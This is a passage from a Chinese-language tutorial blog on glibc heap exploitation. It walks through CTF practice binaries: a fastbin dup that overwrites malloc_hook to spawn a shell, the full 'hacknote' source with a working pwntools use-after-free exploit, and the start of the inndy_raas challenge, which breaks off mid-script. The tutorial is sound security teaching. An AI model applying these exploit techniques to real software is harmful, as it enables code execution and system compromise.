<p>前面應該沒問題，直接從第 59 行開始 debug<br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_6.png" alt=""><br>在這邊先標記一下<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chunk3 = 0x2491530</span><br><span class="line">chunk2 = 0x24914c0</span><br><span class="line">chunk1 = 0x2491450</span><br></pre></td></tr></table></figure><br>首先是 fastbin dup<br>然後在第 66 行 <code>create_note(0x60) # chunk5</code> 取得 chunk3<br>這時候 chunk3 裡面還殘留 chunk1 的位置，就可以被拿來利用<br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_7.png" alt=""><br>67 行透過 <code>get_note</code> 就可以取得 heap 位置了<br>72 行把 chunk1 malloc 出來<br>並且把 chunk1 的 fd 改成 <code>malloc_hook - 0x13</code><br>所以現在是 chunk2 -&gt; chunk1 -&gt; <code>malloc_hook - 0x13</code><br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_8.png" alt=""><br>先到這邊我們來 trace，為什麼是  <code>malloc_hook - 0x13</code> 呢?<br>要先有一個概念，fastbin 在做 unlink 的時候會去看這一排的 fastbinsY 裡面的 size 是否都一樣<br>再來看看  <code>malloc_hook - 0x13</code><br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_9.png" alt=""><br>這樣的結構是不是很像一個 0x70 大小的 fastbin chunk 呢?<br>因為最後 3bit 不看的緣故，所以其實 heap 的大小不看最後一位的數字，因此在 heap size 0x70 == 0x7f<br>也就是說從一開始的 0x70 就是在計算中<br>這是 chunk1 的現況<br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_11.png" alt=""><br>這個位置我也用 vmmap 確認過是可寫的，給各位看一下正常長怎樣<br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_10.png" alt=""><br>其實就是利用 malloc_hook 上面的其他 libc address，用截斷的方式擷取我們要的 size 偽造 chunk<br>在做這個的時候要考量 fd 指向 chunk header，所以 malloc_hook 不能減少於 0x8</p>
<p>再來把 chunk2 和 chunk2 的下一個 address – <code>malloc_hook - 0x13</code> 拿出來<br>在 79 行把 chunk1 的內容改成 <code>&quot;/bin/sh&quot;</code><br>(malloc_hook 已經 malloc 拿出來了，所以 chunk1 的內容已經不重要了，又因為我們前面透過 chunk3 有拿到 chunk1 位置所以 chunk1 比較好用)<br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_12.png" alt=""><br>在 80 行從 <code>malloc_hook 0x13</code> 的位址開始往下把 <code>malloc_hook</code> 的位置覆寫成 <code>system</code> 的位置<br><img src="/img/2019/heap_exploitation/heap_fastbin_dup_13.png" alt=""><br>最後 81 行 <code>create_note(chunk1_heap_address + 0x10)</code> 實際上就是 <code>system(&quot;/bin/sh&quot;)</code><br>因為 system 會把參數 dereference 一次再拿值，所以要給 heap 的位置<br><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man3/system.3.html">https://man7.org/linux/man-pages/man3/system.3.html</a></p>
<p><img src="/img/2019/heap_exploitation/heap_fastbin_dup_poc.png" alt=""></p>
<h2 id="hacknote-glibc-2-25-before-x64"><a href="#hacknote-glibc-2-25-before-x64" class="headerlink" title="hacknote (glibc 2.25 before, x64)"></a>hacknote (glibc 2.25 before, x64)</h2><p>source code:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">struct note &#123;</span><br><span class="line">    void (*printnote)();</span><br><span class="line">    char *content;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct note *notelist[5];</span><br><span class="line">int count = 0;</span><br><span class="line"></span><br><span class="line">void print_note_content(struct note *this)&#123;</span><br><span class="line">    puts(this-&gt;content);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void add_note()&#123;</span><br><span class="line">    int i;</span><br><span class="line">    char buf[8];</span><br><span class="line">    int size;</span><br><span class="line">    if(count &gt; 5)&#123;</span><br><span class="line">        puts(&quot;full&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=0; i&lt;5; i++)&#123;</span><br><span class="line">        if(!notelist[i])&#123;</span><br><span class="line">            notelist[i] = (struct note*)malloc(sizeof(struct note));</span><br><span class="line">            if(!notelist[i])&#123;</span><br><span class="line">                puts(&quot;Allocate error&quot;);</span><br><span class="line">                exit(-1);</span><br><span class="line">            &#125;</span><br><span class="line">            notelist[i]-&gt;printnote = print_note_content;</span><br><span class="line">            printf(&quot;Note size:&quot;);</span><br><span class="line">            read(0, buf, 8);</span><br><span class="line">            size = atoi(buf);</span><br><span class="line">            notelist[i]-&gt;content = (char *)malloc(size);</span><br><span class="line">            if(!notelist[i])&#123;</span><br><span class="line">                puts(&quot;Allocate error&quot;);</span><br><span class="line">                exit(-1);</span><br><span class="line">            &#125;</span><br><span class="line">            printf(&quot;Content: &quot;);</span><br><span class="line">            read(0, notelist[i]-&gt;content, size);</span><br><span class="line">            puts(&quot;Success&quot;);</span><br><span class="line">            count++;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void del_note()&#123;</span><br><span class="line">    char buf[4];</span><br><span class="line">    int idx;</span><br><span class="line">    printf(&quot;Index: &quot;);</span><br><span class="line">    read(0, buf, 4);</span><br><span class="line">    idx = atoi(buf);</span><br><span class="line"></span><br><span class="line">    if(idx&lt;0 || idx&gt;=count)&#123;</span><br><span class="line">        printf(&quot;Out of bound!&quot;);</span><br><span class="line">        _exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    if(notelist[idx])&#123;</span><br><span class="line">        free(notelist[idx]-&gt;content);</span><br><span class="line">        free(notelist[idx]);</span><br><span class="line">        puts(&quot;Success&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void magic()&#123;</span><br><span class="line">    printf(&quot;Congrat!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void print_note()&#123;</span><br><span class="line">    char buf[4];</span><br><span class="line">    int idx;</span><br><span class="line">    printf(&quot;Index: &quot;);</span><br><span class="line">    fgets(buf, 4, stdin);</span><br><span class="line">    idx = atoi(buf);</span><br><span class="line">    if(idx&lt;0 || idx&gt;=count)&#123;</span><br><span class="line">        printf(&quot;Out of bound!&quot;);</span><br><span class="line">        _exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    if(notelist[idx])&#123;</span><br><span class="line">        notelist[idx]-&gt;printnote(notelist[idx]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void menu()&#123;</span><br><span class="line">    puts(&quot;Hacknote:&quot;);</span><br><span class="line">    puts(&quot;1. Add note&quot;);</span><br><span class="line">    puts(&quot;2. Delete note&quot;);</span><br><span class="line">    puts(&quot;3. Print note&quot;);</span><br><span class="line">    puts(&quot;4. Exit&quot;);</span><br><span class="line">    puts(&quot;your choice: &quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    setvbuf(stdin, 0, 2, 0);</span><br><span class="line">    setvbuf(stdout, 0, 2, 0);</span><br><span class="line">    char buf[4];</span><br><span class="line">    while(1)&#123;</span><br><span class="line">        menu();</span><br><span class="line">        read(0, buf, 4);</span><br><span class="line">        switch(atoi(buf))&#123;</span><br><span class="line">            case 1:</span><br><span class="line">                add_note();</span><br><span class="line">                break;</span><br><span class="line">            case 2:</span><br><span class="line">                del_note();</span><br><span class="line">                break;</span><br><span class="line">            case 3:</span><br><span class="line">                print_note();</span><br><span class="line">                break;</span><br><span class="line">            case 4:</span><br><span class="line">                exit(0);</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                puts(&quot;Invaild choice&quot;);</span><br><span class="line">                break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我們用 ubuntu 14.04 的 OS 開他 (因為新版的 libc 增加了 tcache 機制)<br>實際執行的方式看 source code 應該就知道了<br>簡單來說他有 <code>add note</code>、<code>del note</code>、<code>print note</code>、<code>exit</code> 四個選項<br><img src="/img/2019/heap_exploitation/heap_hacknote_1.png" alt=""></p>
<p>我們用 gdb 開他，並新增一個 note 之後看一下 heap 長怎樣<br><img src="/img/2019/heap_exploitation/heap_hacknote_2.png" alt=""></p>
<p><img src="/img/2019/heap_exploitation/heap_hacknote_3.png" alt=""></p>
<p>上面的 <code>0x000000000040089d</code> 會指向 <code>print_note_content</code> 的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/10i 0x000000000040089d</span><br><span class="line">0x40089d &lt;print_note_content&gt;:       push   rbp</span><br><span class="line">0x40089e &lt;print_note_content+1&gt;:     mov    rbp,rsp</span><br><span class="line">0x4008a1 &lt;print_note_content+4&gt;:     sub    rsp,0x10</span><br><span class="line">0x4008a5 &lt;print_note_content+8&gt;:     mov    QWORD PTR [rbp-0x8],rdi</span><br><span class="line">0x4008a9 &lt;print_note_content+12&gt;:    mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">0x4008ad &lt;print_note_content+16&gt;:    mov    rax,QWORD PTR [rax+0x8]</span><br><span class="line">0x4008b1 &lt;print_note_content+20&gt;:    mov    rdi,rax</span><br><span class="line">0x4008b4 &lt;print_note_content+23&gt;:    call   0x400700 &lt;puts@plt&gt;</span><br><span class="line">0x4008b9 &lt;print_note_content+28&gt;:    leave</span><br><span class="line">0x4008ba &lt;print_note_content+29&gt;:    ret</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
<p>對應這一行 source code<br><code>notelist[i]-&gt;printnote = print_note_content;</code><br>而 <code>0x0000000000603030</code> 就是指向我們的 DATA <code>aaaaaaaa</code><br>對應的就是這一段<br><code>notelist[i]-&gt;content = (char *)malloc(size);</code><br>那當我們今天 del 一個 note, 也就是 free 一個 note, heap 會長這個樣子 (最後面那個 <code>0xa</code> 想了很久應該是換行的 <code>0xa</code>)<br><img src="/img/2019/heap_exploitation/heap_hacknote_4.png" alt=""><br>可以看到 fastbin 多了兩個個 chunk 分別指向 <code>0x603000</code> 和 <code>0x603020</code>，第一個是 <code>void (*printnote)();</code> 第二個是 <code>char *content;</code><br>阿因為 <code>fastbin chunk</code> 在 free 的時候不會取消 <code>inuse bit</code> 所以你會看到他們不會填上 <code>prev_size</code> 和 歸0 <code>PREV_INUSE</code></p>
<p>我們試著 add 兩個 note 再看一下 heap<br><img src="/img/2019/heap_exploitation/heap_hacknote_5.png" alt=""><br>一個 note 的空間定義是這個樣子<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct note &#123;</span><br><span class="line">    void (*printnote)();</span><br><span class="line">    char *content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br>紅框跟綠光就是 note 的 heap 空間，裡面分別存了 <code>print_note_content</code> 的記憶體位置和 <code>content</code> 的記憶體位置，橘框跟藍框就是兩個 note 指向的 content 的 heap 空間<br><img src="/img/2019/heap_exploitation/heap_hacknote_6.png" alt=""><br>之後我們把兩個 note free 調再來看看 heap<br><img src="/img/2019/heap_exploitation/heap_hacknote_7-1.png" alt=""></p>
<p><img src="/img/2019/heap_exploitation/heap_hacknote_7.png" alt=""></p>
<p>這時候我們知道這隻程式有 use after free 的問題，所以我們來進行 uaf 的攻擊<br>首先我們先 malloc 一個相同大小的 heap 空間<br><img src="/img/2019/heap_exploitation/heap_hacknote_8.png" alt=""><br>這個 16 是 note 的 heap 空間，我們前面把它 free 掉之後再 malloc 一次達到 use after free<br>然後我們把第一個位置填上 16個 a<br><img src="/img/2019/heap_exploitation/heap_hacknote_9.png" alt=""><br>至此已成功改寫 <code>print_note_content</code> 的記憶體位置達到任意控制 RIP<br><img src="/img/2019/heap_exploitation/heap_hacknote_10.png" alt=""></p>
<p><img src="/img/2019/heap_exploitation/heap_hacknote_11.png" alt=""></p>
<p>這一題的目標是將 rip 控到 <code>magic</code></p>
<p>exploit 的話參考 angelboy 的方式，就是先把各個功能寫一成一個個的 function<br>然後作法是先 add 兩個相同大小的 note<br>在依次 del(free) 掉，在下一次 add note 的時候複寫 <code>printnote</code> 位址改成 <code>magic</code><br>再 call <code>printnote</code> 的時候他就會執行 <code>magic</code> 了<br>poc:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./hacknote&quot;)</span><br><span class="line"></span><br><span class="line">def add_note(size, content):</span><br><span class="line">        io.recvuntil(&quot;choice&quot;)</span><br><span class="line">        io.recvline()</span><br><span class="line">        io.sendline(&quot;1&quot;)</span><br><span class="line">        io.recvuntil(&quot;size:&quot;)</span><br><span class="line">        io.sendline(str(size))</span><br><span class="line">        io.recvuntil(&quot;ent: &quot;)</span><br><span class="line">        io.sendline(str(content))</span><br><span class="line"></span><br><span class="line">def del_note(index):</span><br><span class="line">        io.recvuntil(&quot;choice&quot;)</span><br><span class="line">        io.recvline()</span><br><span class="line">        io.sendline(&quot;2&quot;)</span><br><span class="line">        io.recvuntil(&quot;: &quot;)</span><br><span class="line">        io.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def print_note(index):</span><br><span class="line">        io.recvuntil(&quot;choice&quot;)</span><br><span class="line">        io.recvline()</span><br><span class="line">        io.sendline(&quot;3&quot;)</span><br><span class="line">        io.recvuntil(&quot;: &quot;)</span><br><span class="line">        io.sendline(str(index))</span><br><span class="line">magic =  0x400b28</span><br><span class="line"></span><br><span class="line">add_note(0x50, &quot;dada&quot;)</span><br><span class="line">add_note(0x50, &quot;dada&quot;)</span><br><span class="line">del_note(0)</span><br><span class="line">del_note(1)</span><br><span class="line">add_note(16, p64(magic))</span><br><span class="line">print_note(0)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br>結果:<br><img src="/img/2019/heap_exploitation/heap_hacknote_12.png" alt=""></p>
<h2 id="inndy-raas-glibc-2-25-before-x86"><a href="#inndy-raas-glibc-2-25-before-x86" class="headerlink" title="inndy_raas (glibc 2.25 before, x86)"></a>inndy_raas (glibc 2.25 before, x86)</h2><p>source code:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">struct record &#123;</span><br><span class="line">	void (*print)(struct record *);</span><br><span class="line">	void (*free)(struct record *);</span><br><span class="line">	union &#123;</span><br><span class="line">		int integer;</span><br><span class="line">		char *string;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct record *records[16];</span><br><span class="line"></span><br><span class="line">int ask(const char * q)</span><br><span class="line">&#123;</span><br><span class="line">	char buff[32];</span><br><span class="line">	printf(&quot;%s &gt; &quot;, q);</span><br><span class="line">	fgets(buff, sizeof(buff), stdin);</span><br><span class="line">	return atoi(buff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void rec_int_print(struct record *rec)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Record(Type=Integer, Value=%d)\n&quot;, rec-&gt;integer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void rec_str_print(struct record *rec)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;Record(Type=String, Value=%s)\n&quot;, rec-&gt;string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void rec_int_free(struct record *rec)</span><br><span class="line">&#123;</span><br><span class="line">	free(rec);</span><br><span class="line">	puts(&quot;Record freed!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void rec_str_free(struct record *rec)</span><br><span class="line">&#123;</span><br><span class="line">	free(rec-&gt;string);</span><br><span class="line">	free(rec);</span><br><span class="line">	puts(&quot;Record freed!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void do_new()</span><br><span class="line">&#123;</span><br><span class="line">	int idx = ask(&quot;Index&quot;);</span><br><span class="line"></span><br><span class="line">	if(idx &lt; 0 || idx &gt; 16) &#123;</span><br><span class="line">		puts(&quot;Out of index!&quot;);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line">	if(records[idx]) &#123;</span><br><span class="line">		printf(&quot;Index #%d is used!\n&quot;, idx);</span><br><span class="line">		return;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	struct record *r = records[idx] = (struct record *)malloc(sizeof(struct record));</span><br><span class="line">	r-&gt;print = rec_int_print;</span><br><span class="line">	r-&gt;free = rec_int_free;</span><br><span class="line"></span><br><span class="line">	puts(&quot;Blob type:&quot;);</span><br><span class="line">	puts(&quot;1. Integer&quot;);</span><br><span class="line">	puts(&quot;2. Text&quot;);</span><br><span class="line">	int type = ask(&quot;Type&quot;);</span><br><span class="line">	unsigned int len;</span><br><span class="line"></span><br><span class="line">	switch(type) &#123;</span><br><span class="line">		case 1:</span><br><span class="line">			r-&gt;integer = ask(&quot;Value&quot;);</span><br><span class="line">			break;</span><br><span class="line">		case 2:</span><br><span class="line">			len = ask(&quot;Length&quot;);</span><br><span class="line">			if(len &gt; 1024) &#123;</span><br><span class="line">				puts(&quot;Length too long, please buy record service premium to store longer record!&quot;);</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			r-&gt;string = malloc(len);</span><br><span class="line">			printf(&quot;Value &gt; &quot;);</span><br><span class="line">			fgets(r-&gt;string, len, stdin);</span><br><span class="line">			r-&gt;print = rec_str_print;</span><br><span class="line">			r-&gt;free = rec_str_free;</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			puts(&quot;Invalid type!&quot;);</span><br><span class="line">			return;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	puts(&quot;Okey, we got your data. Here is it:&quot;);</span><br><span class="line">	r-&gt;print(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void do_del()</span><br><span class="line">&#123;</span><br><span class="line">	int idx = ask(&quot;Index&quot;);</span><br><span class="line">	records[idx]-&gt;free(records[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void do_dump()</span><br><span class="line">&#123;</span><br><span class="line">	int idx = ask(&quot;Index&quot;);</span><br><span class="line">	records[idx]-&gt;print(records[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	alarm(600);</span><br><span class="line">	setvbuf(stdout, NULL, _IONBF, 0);</span><br><span class="line">	setvbuf(stdin, NULL, _IONBF, 0);</span><br><span class="line"></span><br><span class="line">	puts(&quot;Welcome to use my Record-as-a-Service (free plan)&quot;);</span><br><span class="line">	puts(&quot;You can only save Integer or String for 600 seconds&quot;);</span><br><span class="line">	puts(&quot;Pay 1,000,000,000,000,000,000,000,000 bitcoins to buy premium plan&quot;);</span><br><span class="line"></span><br><span class="line">	puts(&quot;Here is term of service. You must agree to use this service. Please read carefully!&quot;);</span><br><span class="line">	puts(&quot;================================================================================&quot;);</span><br><span class="line">	system(&quot;cat tos.txt | head -n 30 | sed -e &#x27;s/^/    /&#x27;&quot;);</span><br><span class="line">	puts(&quot;================================================================================&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	while(1) &#123;</span><br><span class="line">		puts(&quot;1. New record&quot;);</span><br><span class="line">		puts(&quot;2. Del record&quot;);</span><br><span class="line">		puts(&quot;3. Show record&quot;);</span><br><span class="line"></span><br><span class="line">		switch(ask(&quot;Act&quot;)) &#123;</span><br><span class="line">			case 1:</span><br><span class="line">				do_new();</span><br><span class="line">				break;</span><br><span class="line">			case 2:</span><br><span class="line">				do_del();</span><br><span class="line">				break;</span><br><span class="line">			case 3:</span><br><span class="line">				do_dump();</span><br><span class="line">				break;</span><br><span class="line">			default:</span><br><span class="line">				puts(&quot;Bye~ Thanks for using our service!&quot;);</span><br><span class="line">				return 0;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我們一樣先 add/del 然後看 heap 的樣子<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">io = process(&quot;./raas&quot;)</span><br><span class="line">context.arch = &#x27;i386&#x27;</span><br><span class="line">context.endian = &#x27;little&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = &#x27;bash&#x27;</span><br><span class="line"></span><br><span class="line">def new_record(index, Type, length, value):</span><br><span class="line">    io.recvuntil(&quot;Act &gt; &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;Index &gt; &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.recvuntil(&quot;Type &gt; &quot;)</span><br><span class="line">    io.sendline(str(Type))</span><br><span class="line">    if str(Type) == &quot;2&quot;:</span><br><span class="line">        io.recvuntil(&quot;Length &gt;&quot;)</span><br><span class="line">        io.sendline(str(length))</span><br><span class="line">    io.recvuntil(&quot;Value &gt; &quot;)</span><br><span class="line">    io.sendline(str(value))</span><br><span class="line"></span><br><span class="line">def del_record(index):</span><br><span class="line">    io.recvuntil(&quot;Act &gt; &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">  